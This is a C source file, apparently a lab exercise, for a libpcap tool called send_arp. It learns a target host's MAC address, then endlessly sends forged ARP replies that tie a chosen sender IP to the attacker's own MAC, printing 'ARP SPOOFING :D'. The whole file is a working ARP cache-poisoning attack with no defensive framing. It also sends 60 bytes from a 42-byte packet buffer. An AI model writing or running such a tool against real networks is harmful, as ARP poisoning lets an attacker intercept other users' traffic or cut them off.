#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>
#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>

/*
- Ethernet Des : FFFFFF:FFFFFF
- Ethernet Src : My Mac
- Sender Mac
- Sender IP
- Target Mac : 00:00:00:00:00:00
- Target IP
*/
void Get_Ip(u_int8_t *ip_addr, u_int8_t *interface)
{
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    memcpy(ip_addr, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, 4);
    close(fd);
}

void Get_Mac(u_int8_t *mac_addr, u_int8_t *interface)
{
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, sizeof(ifr.ifr_name));
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
}

int main(int argc, char *argv[])
{
    if (argc != 4) {
        printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
        printf("sample: sned_arp wlan0 192.168.10.2 192.168.10.1\n");
        return -1;
    }
    pcap_t *handle;
    struct pcap_pkthdr *header;
    u_int8_t buf[PCAP_ERRBUF_SIZE];
    u_int8_t *interface = argv[1];
    u_int8_t attack_ip[4];
    u_int8_t attack_mac[6];
    u_int8_t sip[4];
    u_int8_t tip[4];
    u_int8_t tmac[6];
    u_int8_t packet[42];
    const u_int8_t *packet_get;

    handle = pcap_open_live(interface, BUFSIZ, 1, 1000, buf);
    inet_pton(AF_INET, argv[2], sip);
    inet_pton(AF_INET, argv[3], tip);

    Get_Ip(attack_ip, interface);
    Get_Mac(attack_mac, interface);

    packet[0] = 0xff;packet[1] = 0xff;packet[2] = 0xff;packet[3] = 0xff;packet[4] = 0xff;packet[5] = 0xff;
    packet[6] = attack_mac[0];packet[7] = attack_mac[1];packet[8] = attack_mac[2];packet[9] = attack_mac[3];packet[10] = attack_mac[4];packet[11] = attack_mac[5];
    packet[12] = 0x08; packet[13] = 0x06;
    packet[14] = 0x00;packet[15] = 0x01;packet[16] = 0x08;packet[17] = 0x00;packet[18] = 0x06;packet[19] = 0x04;packet[20] = 0x00;packet[21] = 0x01;
    packet[22] = attack_mac[0];packet[23] = attack_mac[1];packet[24] = attack_mac[2];packet[25] = attack_mac[3];packet[26] = attack_mac[4];packet[27] = attack_mac[5];
    packet[28] = attack_ip[0];packet[29] = attack_ip[1];packet[30] = attack_ip[2];packet[31] = attack_ip[3];
    packet[32] = 0x00; packet[33] = 0x00; packet[34] = 0x00; packet[35] = 0x00; packet[36] = 0x00; packet[37] = 0x00;
    packet[38] = tip[0];packet[39] = tip[1];packet[40] = tip[2];packet[41] = tip[3];

    pcap_sendpacket(handle, packet, 42);
    while(1)
    {
        pcap_next_ex(handle, &header, &packet_get);
        if( (packet_get[12] == 0x08) && (packet_get[13] == 0x06) && (packet_get[20] == 0x00) && (packet_get[21] == 0x02) && (packet_get[28] == tip[0]) &&
                (packet_get[29] == tip[1]) && (packet_get[30] == tip[2]) && (packet_get[31] == tip[3]) )
            break;
    }
    tmac[0] = packet_get[22];tmac[1] = packet_get[23];tmac[2] = packet_get[24];tmac[3] = packet_get[25];tmac[4] = packet_get[26];tmac[5] = packet_get[27];
    packet[0] = tmac[0];packet[1] = tmac[1];packet[2] = tmac[2];packet[3] = tmac[3];packet[4] = tmac[4];packet[5] = tmac[5];
    packet[6] = attack_mac[0];packet[7] = attack_mac[1];packet[8] = attack_mac[2];packet[9] = attack_mac[3];packet[10] = attack_mac[4];packet[11] = attack_mac[5];
    packet[12] = 0x08; packet[13] = 0x06;
    packet[14] = 0x00;packet[15] = 0x01;packet[16] = 0x08;packet[17] = 0x00;packet[18] = 0x06;packet[19] = 0x04;packet[20] = 0x00;packet[21] = 0x02;
    packet[22] = attack_mac[0];packet[23] = attack_mac[1];packet[24] = attack_mac[2];packet[25] = attack_mac[3];packet[26] = attack_mac[4];packet[27] = attack_mac[5];
    packet[28] = sip[0];packet[29] = sip[1];packet[30] = sip[2];packet[31] = sip[3];
    packet[32] = tmac[0]; packet[33] = tmac[1]; packet[34] = tmac[2]; packet[35] = tmac[3]; packet[36] = tmac[4]; packet[37] = tmac[5];
    packet[38] = tip[0];packet[39] = tip[1];packet[40] = tip[2];packet[41] = tip[3];
    while(1)
    {
        pcap_sendpacket(handle, packet, 60);
        printf("ARP SPOOFING :D\n");
    }
}
